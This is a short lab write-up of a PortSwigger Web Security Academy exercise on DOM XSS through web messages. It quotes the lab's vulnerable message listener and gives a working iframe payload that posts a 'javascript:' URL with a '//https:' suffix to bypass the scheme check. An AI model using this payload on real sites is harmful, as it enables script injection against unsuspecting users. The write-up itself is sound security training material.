# [DOM XSS using web messages and a JavaScript URL] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-28
 
---
 
## Vulnerability / core concept
DOM XSS via Web Messages

---


## Payload / key command
This web application uses web messaging and accepts the messages in the following way:
```html
<script>
    window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
        }
    }, false);
</script>
```
As we can see, web application does not check for the origin. Moreover, the security measurement of checking `http/https` is very weak.

To exploit this vulnerable web messaging we can construct and use the following `iframe`:
```html
<iframe src="https://0af800a204370de181139dfa0053007f.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:', '*');"></iframe>
```
In this payload, we are setting the `location.href` to `javascript:print()` to execute the `print()` function. `//https:` part is used to bypass weak security measurement for checking `http/https`.
